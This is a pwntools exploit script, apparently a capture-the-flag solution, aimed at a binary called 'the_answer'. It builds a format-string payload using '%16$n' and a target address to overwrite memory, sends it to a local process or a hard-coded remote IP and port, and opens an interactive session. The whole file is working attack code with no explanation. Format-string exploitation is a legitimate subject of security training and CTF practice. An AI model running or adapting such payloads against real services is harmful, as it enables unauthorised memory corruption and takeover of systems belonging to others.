#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template the_answer
from pwn import *

exe = context.binary = ELF('the_answer')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("149.202.200.158", 6002, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
gef config context.nb_lines_stack 40
tbreak main
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

payload = dict()

payload[0] = b"a" *42 + b"%16$n\x00"
payload[48] = p64(0x601078)

payload = fit(payload)

io.sendline(payload)

io.interactive()

